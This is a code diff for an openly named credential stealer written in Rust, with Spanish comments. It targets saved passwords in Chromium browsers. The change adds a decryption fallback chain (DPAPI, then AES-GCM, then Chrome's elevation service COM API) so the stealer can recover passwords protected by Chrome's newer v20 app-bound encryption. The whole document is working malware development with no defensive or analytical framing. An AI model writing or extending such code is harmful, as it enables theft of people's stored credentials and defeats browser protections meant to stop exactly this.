@@ -1,6 +1,7 @@
 // Stealer para browsers basados en Chromium (Chrome, Edge, Brave, Opera)
 use crate::stealer::{Credential, StealerError, StealerResult};
 use crate::stealer::common::{get_appdata_local, file_exists, base64_decode};
+use crate::stealer::elevation_service; // ← COM API para v20
 use std::path::PathBuf;
 use rusqlite::Connection;
 use aes_gcm::{
@@ -250,21 +251,30 @@ fn extract_credentials_from_db(
             }
             
             // Intentar desencriptar el password
-            // IMPORTANTE: Primero DPAPI (passwords viejos), luego AES-GCM (passwords nuevos)
+            // IMPORTANTE: Primero DPAPI (passwords viejos), luego AES-GCM (passwords nuevos), luego elevation service (v20)
             let password = if let Ok(pwd) = decrypt_dpapi_fallback(&encrypted_pwd) {
                 // DPAPI v1 (Chrome antiguo, pre-v80)
                 writeln!(debug, "       ✅ DPAPI OK").ok();
                 pwd
             } else if let Some(key) = master_key {
-                // AES-256-GCM (Chromium moderno v80+: v10/v11/v20)
+                // AES-256-GCM (Chromium moderno v80+: v10/v11)
                 writeln!(debug, "       ⚠️ DPAPI falló, intentando AES-GCM...").ok();
                 let result = decrypt_aes_gcm(&encrypted_pwd, key);
                 if result.is_ok() {
                     writeln!(debug, "       ✅ AES-GCM OK").ok();
+                    result.unwrap()
                 } else {
                     writeln!(debug, "       ❌ AES-GCM FALLÓ").ok();
+                    // v20 (Chrome 127+): Usar elevation_service.exe COM API
+                    writeln!(debug, "       🔸 Intentando Elevation Service (v20)...").ok();
+                    if let Some(v20_password) = elevation_service::try_decrypt_with_elevation_service(&encrypted_pwd) {
+                        writeln!(debug, "       ✅ ELEVATION SERVICE OK (v20 decrypted)").ok();
+                        v20_password
+                    } else {
+                        writeln!(debug, "       ❌ Elevation Service falló").ok();
+                        "[decrypt failed]".to_string()
+                    }
                 }
-                result.unwrap_or_else(|_| "[decrypt failed]".to_string())
             } else {
                 // Sin master key y DPAPI falló
                 writeln!(debug, "       ❌ No master key disponible").ok();
